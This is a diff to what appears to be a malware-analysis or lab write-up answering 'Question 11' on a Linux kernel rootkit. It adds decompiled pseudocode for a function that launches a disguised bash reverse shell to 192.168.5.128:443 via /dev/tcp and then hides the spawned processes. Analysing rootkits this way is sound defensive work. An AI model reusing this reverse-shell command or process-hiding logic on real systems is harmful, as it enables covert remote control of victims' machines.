@@ -515,8 +515,90 @@ int __fastcall hook_icmp_rcv(sk_buff *skb)
 
 Following spawn_revshell() reveals the reverse-shell command constructed with snprintf(). The command redirects /bin/bash to the hardcoded network endpoint:
 
+**Decompiled Pseudocode:**
 
+```text
+void __fastcall spawn_revshell(work_struct *work)
+{
+  __int64 v2; // rdx
+  __int64 v3; // rdi
+  __int64 v4; // rsi
+  __int64 v5; // rax
+  int v6; // ebp
+  int v7; // eax
+  __int64 v8; // rax
+  __int64 v9; // rdx
+  __int64 v10; // rdi
+  __int64 v11; // rsi
+  __int64 v12; // rbx
+  __int64 i; // r14
+  int v14; // r12d
+  _QWORD argv[5]; // [rsp+0h] [rbp-360h] BYREF
+  char cmd[768]; // [rsp+28h] [rbp-338h] BYREF
+  unsigned __int64 v17; // [rsp+328h] [rbp-38h]
 
+  v17 = __readgsqword(0x28u);
+  argv[0] = "/usr/bin/setsid";
+  argv[1] = "/bin/bash";
+  argv[2] = "-c";
+  argv[4] = 0;
+  memset(cmd, 0, sizeof(cmd));
+  snprintf(
+    s: cmd,
+    maxlen: 0x300u,
+    format: "bash -c 'PID=$$; kill -59 $PID; exec -a \"%s\" /bin/bash &>/dev/tcp/%s/%s 0>&1' &",
+    "firefox-updater",
+    "192.168.5.128",
+    "443");
+  argv[3] = cmd;
+  _rcu_read_lock();
+  v5 = init_task[278];
+  if ( (_QWORD *)v5 == &init_task[278] )
+  {
+    v6 = 0;
+  }
+  else
+  {
+    v2 = v5 - 2224;
+    v6 = 0;
+    do
+    {
+      v7 = *(_DWORD *)(v5 + 208);
+      if ( v6 < v7 )
+        v6 = v7;
+      v5 = *(_QWORD *)(v2 + 2224);
+      v2 = v5 - 2224;
+    }
+    while ( (_QWORD *)v5 != &init_task[278] );
+  }
+  _rcu_read_unlock(a1: v3, a2: v4, a3: v2);
+  v8 = call_usermodehelper_setup(a1: argv[0], a2: argv, a3: envp_0, a4: 3264, a5: 0, a6: 0, a7: 0);
+  if ( v8 != 0 )
+    call_usermodehelper_exec(a1: v8, a2: 2);
+  msleep(a1: 1500);
+  _rcu_read_lock();
+  v12 = init_task[278];
+  for ( i = v12 - 2224; (_QWORD *)v12 != &init_task[278]; i = v12 - 2224 )
+  {
+    v14 = *(_DWORD *)(v12 + 208);
+    if ( v14 > v6
+      && *(_QWORD *)(v12 + 80) != 0
+      && (strstr(haystack: (const char *)(v12 + 752), needle: "firefox-updater") != nullptr
+       || strstr(haystack: (const char *)(v12 + 752), needle: "setsid") != nullptr) )
+    {
+      add_hidden_pid(pid: v14);
+      add_hidden_pid(pid: *(_DWORD *)(v12 + 212));
+    }
+    v12 = *(_QWORD *)(i + 2224);
+  }
+  _rcu_read_unlock(a1: v10, a2: v11, a3: v9);
+  kfree(a1: work);
+}
+```
+
+**Disassembly View:**
+
+![Question 11 Disassembly View](Artifacts/)
 
 
 
